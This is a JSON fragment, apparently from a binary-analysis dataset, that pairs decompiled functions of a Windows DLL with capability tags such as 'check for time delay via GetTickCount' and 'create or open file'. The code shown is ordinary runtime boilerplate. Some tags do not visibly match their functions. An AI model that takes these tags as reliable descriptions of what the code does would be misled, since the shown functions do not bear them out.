        "decompiled_code": "\nvoid fcn.10003af0(uint32_t param_1, uint32_t param_2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    \n    if (param_2 < 0x40000000) {\n        uVar2 = param_1;\n        if (param_2 << 2 < 0x1000) {\ncode_r0x10003b23:\n            fcn.1000acc8(uVar2);\n            return;\n        }\n        if ((param_1 & 0x1f) != 0) goto code_r0x10003b32;\n        uVar2 = *(param_1 - 4);\n        if (param_1 <= uVar2) goto code_r0x10003b37;\n        if (3 < param_1 - uVar2) {\n            if (param_1 - uVar2 < 0x24) goto code_r0x10003b23;\n            goto code_r0x10003b41;\n        }\n    }\n    else {\n        fcn.10010ddf();\ncode_r0x10003b32:\n        fcn.10010ddf();\ncode_r0x10003b37:\n        fcn.10010ddf();\n    }\n    fcn.10010ddf();\ncode_r0x10003b41:\n    fcn.10010ddf();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 315
    },
    "10006e80": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.10006e80(uint *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint *puVar1;\n    int32_t *in_FS_OFFSET;\n    uint in_stack_ffffff84;\n    uint var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x1002aae7;\n    var_ch = *in_FS_OFFSET;\n    var_14h = *0x10040068 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h[4] = 0;\n    arg_8h[5] = 0;\n    arg_8h[5] = 7;\n    arg_8h[4] = 0;\n    puVar1 = arg_8h;\n    if (7 < arg_8h[5]) {\n        puVar1 = *arg_8h;\n    }\n    *puVar1 = 0;\n    var_4h = 0;\n    if (arg_ch != arg_10h) {\n        var_44h = var_44h & 0xffffff00;\n        fcn.10008f60(arg_ch, arg_10h, var_44h, var_14h);\n        var_4h = 1;\n        fcn.100014e0(0, 0);\n        in_stack_ffffff84 = 0;\n        puVar1 = fcn.10004a90(&var_2ch, 0, 0);\n        if (arg_8h != puVar1) {\n            if (7 < arg_8h[5]) {\n                fcn.100026c0(*arg_8h, arg_8h[5] + 1);\n            }\n            arg_8h[5] = 7;\n            arg_8h[4] = 0;\n            if (7 < arg_8h[5]) {\n                arg_8h = *arg_8h;\n            }\n            *arg_8h = 0;\n            fcn.10002f80(puVar1);\n        }\n        if (7 < var_18h) {\n            fcn.100026c0(var_2ch, var_18h + 1);\n        }\n        fcn.10007250();\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.1000ac84(in_stack_ffffff84);\n    return;\n}\n",
        "token_count": 619
    },
    "10009680": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.10009680(uint *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint *puVar1;\n    int32_t *in_FS_OFFSET;\n    uint in_stack_ffffff84;\n    uint var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x1002aae7;\n    var_ch = *in_FS_OFFSET;\n    var_14h = *0x10040068 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h[4] = 0;\n    arg_8h[5] = 0;\n    arg_8h[5] = 7;\n    arg_8h[4] = 0;\n    puVar1 = arg_8h;\n    if (7 < arg_8h[5]) {\n        puVar1 = *arg_8h;\n    }\n    *puVar1 = 0;\n    var_4h = 0;\n    if (arg_ch != arg_10h) {\n        var_44h = var_44h & 0xffffff00;\n        fcn.100098d0(arg_ch, arg_10h, var_44h, var_14h);\n        var_4h = 1;\n        fcn.100014e0(0, 0);\n        in_stack_ffffff84 = 0;\n        puVar1 = fcn.10004a90(&var_2ch, 0, 0);\n        if (arg_8h != puVar1) {\n            if (7 < arg_8h[5]) {\n                fcn.100026c0(*arg_8h, arg_8h[5] + 1);\n            }\n            arg_8h[5] = 7;\n            arg_8h[4] = 0;\n            if (7 < arg_8h[5]) {\n                arg_8h = *arg_8h;\n            }\n            *arg_8h = 0;\n            fcn.10002f80(puVar1);\n        }\n        if (7 < var_18h) {\n            fcn.100026c0(var_2ch, var_18h + 1);\n        }\n        fcn.10007250();\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.1000ac84(in_stack_ffffff84);\n    return;\n}\n",
        "token_count": 618
    },
    "1000a6ed": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.1000a6ed(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.10011806(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "1001f45c": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.1001f45c(void)\n\n{\n    *0x10040970 = (*_sym.imp.KERNEL32.dll_CreateFileW)(L\"CONOUT$\", 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "10001ed0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.10001ed0(code **param_1)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    *param_1 = vtable.std::_Node_if.0;\n    puVar3 = param_1[6];\n    while (puVar3 != NULL) {\n        puVar1 = puVar3[6];\n        puVar3[6] = 0;\n        puVar2 = param_1[5];\n        puVar4 = puVar3;\n        while ((puVar3 = puVar1,  puVar4 != puVar2 && (puVar4 != NULL))) {\n            puVar3 = puVar4[3];\n            puVar4[3] = 0;\n            (***puVar4)(1);\n            puVar4 = puVar3;\n        }\n    }\n    *param_1 = vtable.std::_Node_base.0;\n    return;\n}\n",
        "token_count": 216
    }
}